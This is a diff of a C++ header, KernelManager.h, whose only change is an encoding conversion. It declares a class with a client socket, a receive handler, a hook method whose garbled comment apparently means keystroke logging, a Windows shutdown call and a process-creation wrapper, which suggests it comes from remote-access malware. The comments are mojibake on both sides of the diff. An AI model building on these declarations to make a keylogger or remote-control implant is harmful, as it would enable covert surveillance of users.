@@ -1,4 +1,4 @@
-// KernelManager.h: interface for the CKernelManager class.
+ï»¿// KernelManager.h: interface for the CKernelManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -21,8 +21,8 @@ public:
 
 	virtual ~CKernelManager();
 	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
-	void StartUnLineHook();//¼üÅÌ¼ÇÂ¼
-	CKernelManager(CClientSocket *pClient);//¼üÅÌ¼ÇÂ¼
+	void StartUnLineHook();//é”®ç›˜è®°å½•
+	CKernelManager(CClientSocket *pClient);//é”®ç›˜è®°å½•
 	char	m_strServiceName[256];
 
 	void ShutdownWindows(DWORD dwReason);
@@ -39,7 +39,7 @@ public:
 	BOOL	m_bIsActived;
 
 private:
-	HANDLE	m_hThread[10000]; // ×ã¹»ÓÃÁË
+	HANDLE	m_hThread[10000]; // è¶³å¤Ÿç”¨äº†
 	UINT	m_nThreadCount;
 	DWORD	m_dwServiceType;
 	BOOL API_CreateProcessA(
